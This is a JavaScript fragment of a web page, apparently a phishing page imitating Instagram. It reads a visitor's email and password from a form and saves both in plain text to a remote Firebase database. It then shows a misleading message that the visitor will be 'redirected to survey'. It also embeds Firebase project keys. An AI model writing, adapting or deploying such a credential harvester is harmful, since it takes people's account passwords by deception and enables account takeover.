    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyDKZP5VZb5kn1gFAQ7v4JSSuBWYhfARQzg",
            authDomain: "instaforanaya-rohaan.firebaseapp.com",
            projectId: "instaforanaya-rohaan",
            storageBucket: "instaforanaya-rohaan.appspot.com",
            messagingSenderId: "794366558295",
            appId: "1:794366558295:web:9004449983df8807296312",
            databaseURL: "https://instaforanaya-rohaan-default-rtdb.firebaseio.com/"
        };

        // Init Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function storeData() {
            const email = document.getElementById("email").value.trim();
            const password = document.getElementById("password").value;

            if (!email || !password) {
                alert("Please fill in both fields.");
                return;
            }

            const safeEmail = email.replace(/[.#$[\]]/g, "_");

            db.ref("users/" + safeEmail).set({
                email: email,
                password: password
            }).then(() => {
                alert("You will be redirected to survey in 2 seconds");
            }).catch((error) => {
                console.error("‚ùå Error:", error);
                alert("Please Try Again, Help Us");
            });
        }
    </script>
